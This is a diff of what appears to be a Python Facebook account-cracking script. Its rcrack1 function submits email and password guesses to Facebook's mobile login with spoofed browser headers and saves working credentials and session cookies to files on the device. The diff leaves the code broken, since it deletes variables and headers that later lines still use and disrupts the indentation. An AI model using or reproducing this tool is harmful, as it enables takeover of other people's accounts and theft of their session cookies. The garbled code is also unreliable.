@@ -68,19 +68,13 @@ bu = current.month
 ha = current.day
 today = date.today() 
 #--------------------------(COUNT BOX)--------------------------#
-loop = 0
-oks = []
-cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-ugen=[]
-uas=[]
-usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
-rr = random.randint
+
+
 #--------------------------(UA BOX)--------------------------#
+
+    
+
+
 
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""
@@ -186,30 +180,28 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-           'method': 'GET', 
-       	'
-          'sec-ch-prefers-color-scheme': 'light',
-          'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-          'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
-          'sec-ch-ua-mobile': '?1',
-          'sec-ch-ua-model': '"V2043"',
-          'sec-ch-ua-platform': '"Android"',
-          'sec-ch-ua-platform-version': '"11.0.0"',
-          'sec-fetch-dest': 'document',
-          'sec-fetch-mode': 'navigate',
-          'sec-fetch-site': 'none',
-          'sec-fetch-user': '?1',
-          'upgrade-insecure-requests': '1',
-          'user-agent': pro,
-          'viewport-width': '980',}
-           
-                cid = coki[65:80]
+       
+         
+       
+         
+         
+       
+        
+          
+     
+         
+        
+          
+          
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            
+               
+               
                 print(f"\033[38;5;46m[PROTIK MONDAL -OK] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
-                break
-                cid = coki[82:97]
+         
+           
 #              print(f"\x1b[38;5;196m[PROTIK MONDAL -CP💔] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
@@ -233,9 +225,14 @@ def shoha_menu():
         os.system("clear")
         os.system("xdg-open https://www.facebook.com/protik.mondal.52459/")
         time.sleep(3.0)
+        
         os.system("clear")
-        print(logo)
+      
         print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Free because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        
+       
+     
+        
         os.system("xdg-open :https://www.facebook.com/protik.mondal.52459/")
         shoha_menu()   
 shoha_menu()
